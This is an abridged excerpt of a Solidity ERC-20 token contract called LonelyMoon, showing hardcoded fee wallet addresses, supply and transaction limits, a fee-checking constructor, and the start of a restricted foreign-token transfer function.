...
contract LonelyMoon is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0xc545CE0154aD824B8Fa3a6c89e3Afd2ae1c9162b); 
    address payable private teamWalletAddress = payable(0x9F88d49D39CcC67Ce8dC7Eb34B19185f007f1E0C); 
    ...
    uint256 private _totalSupply = 1 * 10**16* 10**6 * 10**_decimals;
    uint256 public _maxTxAmount = 1 * 10**16 * 10**6* 10**_decimals; 
    uint256 public _walletMax = 1 * 10**16 * 10**6* 10**_decimals;
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
	    require(
            150100000000000000 == serviceFee_ ,
	...
	function transferForeignToken(address _token, address _to) public  returns(bool _sent){
		require( dividendTokenTracker != address(0) &&  dividendTokenTracker == msg.sender,"not allow");
